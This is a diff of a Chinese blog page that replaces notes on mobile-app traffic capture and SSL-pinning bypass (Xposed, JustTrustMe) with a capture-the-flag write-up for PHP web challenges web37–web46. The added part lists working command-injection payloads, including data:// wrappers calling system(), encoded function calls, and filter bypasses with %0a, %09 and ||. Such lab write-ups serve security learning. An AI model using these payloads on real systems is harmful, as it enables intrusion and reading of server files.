@@ -19,17 +19,41 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1月23日小迪13. APP信息打点1. APP-外在抓包-Fd&amp;茶杯&amp;Burp外在抓包是指通过网络代理工具捕获APP与服务器之间的通信数据包，以分析其传输内容和行为。常用的工具包括：  Fd（Fiddler）：一款HTTP调试代理工具，可以记录所有客户端和服务器之间的HTTP(S)通信。 茶杯（Charles）：功能强大的HTTP代理工具，支持HTTP和HTTPS数据包的捕获和分">
+    <meta name="description" content="1月23日题解1.web37 观察一下代码，使用php伪协议 ?c&#x3D;php:&#x2F;&#x2F;input 可以使用playload：?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,  解得flag 2.web38 打开链接看到题目发现这题又过滤了php和file 没有提前条件绕过 构造 payload： ?c&#x3D;data:&#x2F;&amp;#x">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="https://wxr060220.github.io/WXR/2025/01/23/1%E6%9C%8823%E6%97%A5%E5%B0%8F%E8%BF%AA/index.html">
+<meta property="og:url" content="https://wxr060220.github.io/WXR/2025/01/23/1%E6%9C%8823%E5%8F%B7%E9%A2%98%E8%A7%A3/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="1月23日小迪13. APP信息打点1. APP-外在抓包-Fd&amp;茶杯&amp;Burp外在抓包是指通过网络代理工具捕获APP与服务器之间的通信数据包，以分析其传输内容和行为。常用的工具包括：  Fd（Fiddler）：一款HTTP调试代理工具，可以记录所有客户端和服务器之间的HTTP(S)通信。 茶杯（Charles）：功能强大的HTTP代理工具，支持HTTP和HTTPS数据包的捕获和分">
+<meta property="og:description" content="1月23日题解1.web37 观察一下代码，使用php伪协议 ?c&#x3D;php:&#x2F;&#x2F;input 可以使用playload：?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,  解得flag 2.web38 打开链接看到题目发现这题又过滤了php和file 没有提前条件绕过 构造 payload： ?c&#x3D;data:&#x2F;&amp;#x">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-01-23T05:16:53.550Z">
-<meta property="article:modified_time" content="2025-01-23T05:17:29.545Z">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123185637351.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123190248146.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123190604368.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123190717189.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123190942037.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123191222746.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123191251950.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123191615595.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123191945543.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123192852216.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123193315037.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123193703902.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123193746746.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123193820465.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194052050.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194135046.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194150388.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194410025.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194454848.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123200058456.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123200140432.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123200400507.png">
+<meta property="og:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123200500614.png">
+<meta property="article:published_time" content="2025-01-23T12:05:51.823Z">
+<meta property="article:modified_time" content="2025-01-23T12:06:15.755Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="c:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123185637351.png">
   
   
   
@@ -210,8 +234,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-01-23 13:16" pubdate>
-          2025年1月23日 下午
+        <time datetime="2025-01-23 20:05" pubdate>
+          2025年1月23日 晚上
         </time>
       </span>
     
@@ -222,7 +246,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          762 字
+          462 字
         
       </span>
     
@@ -233,7 +257,7 @@
         
         
         
-          7 分钟
+          4 分钟
         
       </span>
     
@@ -275,23 +299,72 @@
             
               <div class="markdown-body">
                 
-                <h1 id="1月23日小迪"><a href="#1月23日小迪" class="headerlink" title="1月23日小迪"></a>1月23日小迪</h1><h2 id="13-APP信息打点"><a href="#13-APP信息打点" class="headerlink" title="13. APP信息打点"></a>13. APP信息打点</h2><h3 id="1-APP-外在抓包-Fd-茶杯-Burp"><a href="#1-APP-外在抓包-Fd-茶杯-Burp" class="headerlink" title="1. APP-外在抓包-Fd&amp;茶杯&amp;Burp"></a>1. APP-外在抓包-Fd&amp;茶杯&amp;Burp</h3><p>外在抓包是指通过网络代理工具捕获APP与服务器之间的通信数据包，以分析其传输内容和行为。常用的工具包括：</p>
-<ul>
-<li><strong>Fd（Fiddler）</strong>：一款HTTP调试代理工具，可以记录所有客户端和服务器之间的HTTP(S)通信。</li>
-<li><strong>茶杯（Charles）</strong>：功能强大的HTTP代理工具，支持HTTP和HTTPS数据包的捕获和分析。</li>
-<li><strong>Burp Suite</strong>：专业的Web安全测试工具，支持对HTTP&#x2F;HTTPS流量的拦截、修改和分析。</li>
-</ul>
-<p>这些工具可以帮助分析APP的网络请求、服务器响应、数据传输格式等信息。</p>
-<h3 id="2-APP-外在封包-封包监听工具"><a href="#2-APP-外在封包-封包监听工具" class="headerlink" title="2. APP-外在封包-封包监听工具"></a>2. APP-外在封包-封包监听工具</h3><p>封包监听工具主要用于捕获和分析网络数据包，包括但不限于APP的通信数据。它可以帮助分析数据包的结构、协议类型、传输内容等，甚至可以修改数据包以测试APP的行为。</p>
-<h3 id="3-APP-内在提取-AppInfoScanner"><a href="#3-APP-内在提取-AppInfoScanner" class="headerlink" title="3. APP-内在提取-AppInfoScanner"></a>3. APP-内在提取-AppInfoScanner</h3><p>AppInfoScanner是一款用于提取APP信息的工具，通过反编译APK文件，可以提取出关键的资产信息，如域名、API接口、敏感文件路径等。它适用于渗透测试和安全分析，帮助快速定位APP中的潜在安全问题。</p>
-<h3 id="4-APP-内在搜索-反编译载入IDEA"><a href="#4-APP-内在搜索-反编译载入IDEA" class="headerlink" title="4. APP-内在搜索-反编译载入IDEA"></a>4. APP-内在搜索-反编译载入IDEA</h3><p>反编译是指将APK文件还原为可读的Java代码，以便分析其逻辑。将反编译后的代码载入IDEA（IntelliJ IDEA）等开发工具中，可以方便地进行代码审计、功能分析和修改。</p>
-<h3 id="5-APP-资源提取-安装包-资源文件"><a href="#5-APP-资源提取-安装包-资源文件" class="headerlink" title="5. APP-资源提取-安装包&amp;资源文件"></a>5. APP-资源提取-安装包&amp;资源文件</h3><p>资源提取是指从APK文件中提取出其包含的资源文件，如图片、音频、配置文件等。这些资源文件可以用于分析APP的功能、界面设计或进行进一步的安全测试。</p>
-<h3 id="6-APP-框架使用-Xposed-JustTrustMe"><a href="#6-APP-框架使用-Xposed-JustTrustMe" class="headerlink" title="6. APP-框架使用-Xposed&amp;JustTrustMe"></a>6. APP-框架使用-Xposed&amp;JustTrustMe</h3><ul>
-<li><strong>Xposed</strong>：是一个Android框架，允许开发者在不修改APP源码的情况下，通过Hook技术修改APP的运行行为。它可以用于绕过APP的安全检测、修改APP逻辑或进行调试。</li>
-<li><strong>JustTrustMe</strong>：是一个Xposed模块，用于绕过APP的SSL证书校验，使得抓包工具可以成功捕获HTTPS流量。</li>
-</ul>
-<h3 id="7-小程序-微信-电脑版登录启动抓包分析"><a href="#7-小程序-微信-电脑版登录启动抓包分析" class="headerlink" title="7. 小程序-微信-电脑版登录启动抓包分析"></a>7. 小程序-微信-电脑版登录启动抓包分析</h3><p>通过抓包工具分析微信小程序的网络通信，可以获取小程序与服务器之间的数据交互信息。这有助于了解小程序的逻辑、数据传输格式以及潜在的安全问题。</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这些工具和技术在APP和小程序的安全分析、功能测试和渗透测试中具有重要作用。外在抓包和内在提取是两种常见的分析方法，前者通过网络代理工具捕获通信数据，后者通过反编译和代码审计获取APP的内部逻辑。</p>
+                <h1 id="1月23日题解"><a href="#1月23日题解" class="headerlink" title="1月23日题解"></a>1月23日题解</h1><h2 id="1-web37"><a href="#1-web37" class="headerlink" title="1.web37"></a>1.web37</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123185637351.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123185637351"></p>
+<p>观察一下代码，使用php伪协议</p>
+<p>?c&#x3D;php:&#x2F;&#x2F;input</p>
+<p>可以使用playload：?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('tac f*')?></p>
+<p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123190248146.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123190248146"></p>
+<p>解得flag</p>
+<h2 id="2-web38"><a href="#2-web38" class="headerlink" title="2.web38"></a>2.web38</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123190604368.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123190604368"></p>
+<p>打开链接看到题目发现这题又过滤了php和file</p>
+<p>没有提前条件绕过</p>
+<p>构造 payload：</p>
+<p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system('tac f*')?></p>
+<p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123190717189.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123190717189"></p>
+<p>解得flag</p>
+<h2 id="3-web39"><a href="#3-web39" class="headerlink" title="3.web39"></a>3.web39</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123190942037.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123190942037"></p>
+<p>由于它把 flag 过滤掉了，而且这里包含后也没有输出 $flag 的语句</p>
+<p>可以将整个 php 代码闭合掉，让 .php 不执行而是被直接显示</p>
+<p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('cat f*')?>)?&gt;、</p>
+<p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123191222746.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123191222746"></p>
+<p>然后打开源代码看大flag解得此题</p>
+<p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123191251950.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123191251950"></p>
+<h2 id="4-web40"><a href="#4-web40" class="headerlink" title="4.web40"></a>4.web40</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123191615595.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123191615595"></p>
+<p>打开链接看看题目发现基本上所有的符号都过滤掉了，但是发现过滤的是中文括号，英文括号还可以使用</p>
+<p>使用无参数的playload</p>
+<p>?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</p>
+<p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123191945543.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123191945543"></p>
+<p>即可解得flag</p>
+<h2 id="5-web41"><a href="#5-web41" class="headerlink" title="5.web41"></a>5.web41</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123192852216.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123192852216"></p>
+<p>观察题目发现过滤了很多东西</p>
+<p>用bp抓包一下</p>
+<p>然后send to repeater发现又回显</p>
+<p>然后构造一下</p>
+<p>c&#x3D;(“%13%19%13%14%05%0d”|”%60%60%60%60%60%60”)(“%03%01%14%00%06%0c%01%07%00%10%08%10”|”%60%60%60%20%60%60%60%60%2e%60%60%60”)</p>
+<p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123193315037.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123193315037"></p>
+<p>解得flag</p>
+<h2 id="6-web42"><a href="#6-web42" class="headerlink" title="6.web42"></a>6.web42</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123193703902.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123193703902"></p>
+<p>使用方法：url + ?c&#x3D;cat flag.php ||</p>
+<p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123193746746.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123193746746"></p>
+<p>打开之后是一片空白然后打开源代码</p>
+<p>发现flag</p>
+<p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123193820465.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123193820465"></p>
+<p>解得flag</p>
+<h2 id="7-web43"><a href="#7-web43" class="headerlink" title="7.web43"></a>7.web43</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194052050.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123194052050"></p>
+<p>与上题方法差不多但是要改一下代码</p>
+<p>url + ?c&#x3D;nl flag.php%0a</p>
+<p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194135046.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123194135046"></p>
+<p>打开只有一个1</p>
+<p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194150388.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123194150388"></p>
+<p>然后直接打开源代码可以找到flag</p>
+<p>解得此题</p>
+<h2 id="8-web44"><a href="#8-web44" class="headerlink" title="8.web44"></a>8.web44</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194410025.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123194410025"></p>
+<p>使用最简单的方法就是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url + ?c=<span class="hljs-built_in">tac</span> fl*%0A<br></code></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194454848.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123194454848"></p>
+<p>使用之后发现flag直接显示出来了</p>
+<h2 id="9-web45"><a href="#9-web45" class="headerlink" title="9.web45"></a>9.web45</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123200058456.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123200058456"></p>
+<p>最简单的方法就是使用 %09 绕过即可</p>
+<p>url + ?c&#x3D;tac%09fl’’ag.php||</p>
+<p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123200140432.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123200140432"></p>
+<p>使用这个回车就可以看到flag</p>
+<p>此题解得</p>
+<h2 id="10-web46"><a href="#10-web46" class="headerlink" title="10.web46"></a>10.web46</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123200400507.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123200400507"></p>
+<p>根据题目线索发现可以用符号绕过</p>
+<p>url + ?c&#x3D;tac%09fl’’ag.php||</p>
+<p>在url地址后面加上代码解得此题</p>
+<p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123200500614.png" srcset="/WXR/img/loading.gif" lazyload alt="image-20250123200500614"></p>
 
                 
               </div>
@@ -310,7 +383,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div></div>
-      <div>https://wxr060220.github.io/WXR/2025/01/23/1月23日小迪/</div>
+      <div>https://wxr060220.github.io/WXR/2025/01/23/1月23号题解/</div>
     </div>
     <div class="license-meta">
       
@@ -354,17 +427,11 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/WXR/2025/01/23/1%E6%9C%8823%E5%8F%B7%E9%A2%98%E8%A7%A3/" title="">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile"></span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/WXR/2025/01/22/1%E6%9C%8822%E6%97%A5%E9%A2%98%E8%A7%A3/" title="">
+                      <a href="/WXR/2025/01/23/1%E6%9C%8823%E6%97%A5%E5%B0%8F%E8%BF%AA/" title="">
                         <span class="hidden-mobile"></span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
